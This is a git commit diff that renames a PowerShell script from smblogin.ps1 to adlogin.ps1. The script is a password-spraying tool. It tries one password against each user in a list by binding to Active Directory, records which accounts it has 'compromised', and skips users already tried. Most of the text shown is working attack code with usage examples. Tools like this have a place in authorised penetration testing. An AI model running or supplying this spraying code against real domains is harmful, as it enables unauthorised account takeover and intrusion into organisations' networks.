043c6c234cb626e77c7c5b06fc8383ab6c0f6118
InfosecMatter <60963123+InfosecMatter@users.noreply.github.com>
2020-03-11 21:01:33 +0400

    Update and rename smblogin.ps1 to adlogin.ps1

--- adlogin.ps1
+++ adlogin.ps1
@@ -3,23 +3,23 @@ Function adcheck {
   (new-object directoryservices.directoryentry "",$u,$p).psbase.name -ne $null
 }
  
-Function smblogin {
+Function adlogin {
   param($userlist,$domain,$pwd)
 
   if (!$pwd) {
-    Write-Host "usage: smblogin <userlist.txt> <domain> <password>"
-    Write-Host " e.g.: smblogin users.txt domain.com P@ssw0rd`n"
+    Write-Host "usage: adlogin <userlist.txt> <domain> <password>"
+    Write-Host " e.g.: adlogin users.txt domain.com P@ssw0rd`n"
     return
   }
-  $results = ".\smblogin.$pwd.txt"
+  $results = ".\adlogin.$pwd.txt"
 
-  foreach($line in Get-Content $userlist) {
-    $x = (gc $results -EA SilentlyContinue | select-string "^$line,.*,True$")
+  foreach($line in gc $userlist) {
+    $x = (gc $results -EA SilentlyContinue | sls "^$line,.*,True$")
     if ($x) {
       Write-Host "user $line already compromised"
       continue
     }
-    $x = (gc $results | select-string -CaseSensitive "^$line,$pwd,")
+    $x = (gc $results | sls -CaseSensitive "^$line,$pwd,")
     if ($x) {
       Write-Host "user $line with $pwd already tried"
       continue
